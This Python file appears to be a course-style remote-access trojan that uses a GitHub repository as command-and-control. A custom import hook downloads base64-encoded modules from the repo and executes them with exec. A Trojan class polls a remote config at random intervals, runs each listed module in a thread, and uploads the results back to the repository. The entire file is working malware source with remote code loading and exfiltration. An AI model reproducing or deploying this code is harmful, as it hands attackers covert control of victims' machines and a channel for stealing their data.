import base64
from datetime import datetime
import github3
import importlib
import json
import random
import sys
from sys import platform
import threading
import time

def github_connect():
    """
    returns a session with the repository
    """
    with open("mytoken.txt") as f:
        token = f.read()
    user = "vanHooijdonkC"
    sess = github3.login(token=token)
    return sess.repository(user, "EH8")


def get_file_contents(dirname, module_name, repo):
    """
    returns the content of the file
    """
    return repo.file_contents(f"{dirname}/{module_name}").content


def get_os():
    """
    returns the operating system of the server
    """
    # check what os this system runs
    if platform == "linux" or platform == "linux2":
        return "linux"
    elif platform == "darwin":
        return "macos"
    elif platform == "win32":
        return "windows"
    else:
        return "No known OS detected"


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        try:
            print("[*] Attempting to retrieve %s" % name)
            self.repo = github_connect()

            new_library = get_file_contents("modules", f"{name}.py", self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        except:
            print("[x] Failed import of: " + name)

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(
            name, loader=None, origin=self.repo.git_url
        )
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f"{id}.json"
        self.data_path = f"data/{id}/"
        self.repo = github_connect()
        self.os = get_os()

    def get_config(self):
        config_json = get_file_contents("config", self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task["module"] not in sys.modules:
                exec("import %s" % task["module"])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run(self.os)
        self.store_module_result(result, module)

    def store_module_result(self, data, module):
        message = datetime.now().isoformat()
        remote_path = f"data/{message}.data"
        bindata = bytes("%r" % data, "utf-8")
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner, args=(task["module"],)
                )
                thread.start()

            time.sleep(random.randint(60, 5 * 60))


if __name__ == "__main__":
    sys.meta_path.append(GitImporter())
    trojan = Trojan("config")
    trojan.run()
